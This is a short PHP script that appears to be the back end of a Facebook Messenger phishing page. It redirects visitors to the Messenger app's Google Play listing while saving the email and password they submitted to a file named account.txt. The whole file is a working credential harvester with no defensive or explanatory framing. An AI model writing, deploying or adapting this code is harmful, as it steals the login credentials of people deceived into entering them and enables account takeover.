<?php
header('Location:https://play.google.com/store/apps/details?id=com.facebook.orca');
 $message .= $_POST['email'].":";
$message .= $_POST['pass']. "\n";
file_put_contents('account.txt', $message, FILE_APPEND);